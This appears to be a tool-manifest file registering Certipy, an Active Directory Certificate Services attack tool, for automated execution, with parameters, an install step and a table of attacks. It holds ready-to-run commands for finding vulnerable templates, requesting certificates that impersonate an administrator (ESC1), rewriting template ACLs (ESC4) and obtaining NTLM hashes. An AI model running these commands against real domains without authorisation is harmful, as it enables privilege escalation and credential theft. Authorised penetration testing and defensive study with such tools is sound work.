---
id: security-ad-certipy
namespace: security:ad:certipy
name: Certipy
description: Active Directory Certificate Services (AD CS) exploitation tool that
  finds vulnerable certificate templates, escrows, and performs ESC1-ESC8 attacks
  for domain privilege escalation.
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - security.ad.cs.find
  - security.ad.cs.esc1
  - security.ad.cs.esc4
  - security.ad.cs.auth
  - security.ad.cert.enum
platforms:
  - linux
  - cross-platform
risk_level: high
trust_level: verified
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies:
  - python3
  - impacket
related_tools:
  - bloodhound
  - netexec
contract:
  inputs:
    - type: network.target.ip
      description: Domain controller or CA server IP
    - type: credential.username
      description: Domain username
    - type: credential.password
      description: Domain password
  outputs:
    - type: security.ad.certificate
      description: Obtained certificate (PFX file)
    - type: security.ad.credential
      description: Authentication-derived NTLM hash
  side_effects:
    - network_traffic
resource_profile:
  cpu: low
  memory_mb: 64
  network: low
  disk_io: low
allowed-tools:
  - certipy
parameters:
  - name: action
    type: string
    required: true
    description: "Action: find, req, auth, template"
  - name: target
    type: string
    required: false
    description: "Target CA server or domain controller"
  - name: username
    type: string
    required: false
    description: "Domain username"
  - name: password
    type: string
    required: false
    description: "Domain password"
  - name: ca
    type: string
    required: false
    description: "Certificate Authority name"
  - name: template
    type: string
    required: false
    description: "Certificate template name (for ESC1/ESC4)"
global_vars:
  target: ip
  username: user
execution:
  template: "certipy-ad {action}"
  sandbox: execFile
  timeout_seconds: 60
  shell: false
examples:
  - description: "Find vulnerable certificate templates and CAs"
    command: certipy-ad find -u user@evilcorp.local -p pass123 -dc-ip 10.10.10.1
  - description: "Find vulnerable templates with DNS-TCP transport"
    command: certipy-ad find -u {{USER}}@{{DOMAIN}} -p '{{PASSWORD}}' -dc-ip {{IP}} -dns-tcp
  - description: "ESC1 — request certificate as a different user (machine account)"
    command: certipy-ad req -u user@evilcorp.local -p pass123 -ca EVILCORP-CA -template VulnTemplate -upn administrator@evilcorp.local
  - description: "Authenticate with obtained PFX certificate to get NTLM hash"
    command: certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.10.1
  - description: "ESC4 — modify vulnerable template to enable ESC1"
    command: certipy-ad template -u user@evilcorp.local -p pass123 -template VulnTemplate -save-old
  - description: "List CAs and servers"
    command: certipy-ad find -u {{USER}}@{{DOMAIN}} -p '{{PASSWORD}}' -dc-ip {{IP}} -enabled
references:
  - label: "Certipy GitHub"
    url: "https://github.com/ly4k/Certipy"
techniques:
  - privilege-escalation
  - credential-access
attack_types:
  - Exploitation
  - PrivilegeEscalation
items:
  - Password
  - NoCreds
services:
  - ADCS
  - LDAP
install:
    - method: pip
      package_name: "certipy-ad"
      commands:
        - "pip install certipy-ad"
---

# Certipy — AD CS Exploitation

Certipy is a Python-based tool for attacking Active Directory Certificate Services. It automates the discovery and exploitation of certificate template vulnerabilities (ESC1-ESC8).

## Common Attacks

| Attack | Description | Command |
|--------|-------------|---------|
| **find** | Enumerate CAs and vulnerable templates | `certipy-ad find` |
| **ESC1** | Certificate with SAN (subjectAltName) spoofing | `certipy-ad req -template Vuln -upn admin@corp` |
| **ESC4** | Modify template ACLs to enable ESC1 | `certipy-ad template -template Vuln` |
| **auth** | Authenticate with PFX to get NTLM hash | `certipy-ad auth -pfx cert.pfx` |
| **req** | Request certificate from CA | `certipy-ad req -ca CA-NAME -template Template` |
